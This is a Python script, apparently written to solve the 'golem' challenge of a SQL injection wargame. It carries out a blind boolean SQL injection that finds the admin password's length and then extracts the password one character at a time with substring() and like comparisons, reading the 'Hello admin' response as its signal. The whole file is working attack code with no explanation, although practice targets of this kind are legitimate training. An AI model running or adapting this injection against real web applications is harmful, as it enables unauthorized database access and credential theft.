import requests

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1' || id like 'admin' %26%26 "
head = {'Cookie' : 'PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg'}

length = 1
pwd = ''

while (1):
    query = "length(pw) like '{}".format(length)
    req = requests.get(url+query, headers=head)
    print("[ +",length,"]")
    if "Hello admin" in req.text:
        print("총 길이는",length)
        break
    else:
        length = length + 1

for i in range(1, length+1):
    for j in range(48, 122):
        query = "substring(pw,{},1) like '{}".format(str(i),chr(j))
        req = requests.get(url+query, headers=head)
        if "Hello admin" in req.text:
            print(pwd)
            pwd = pwd + chr(j)
            break
            
print(pwd)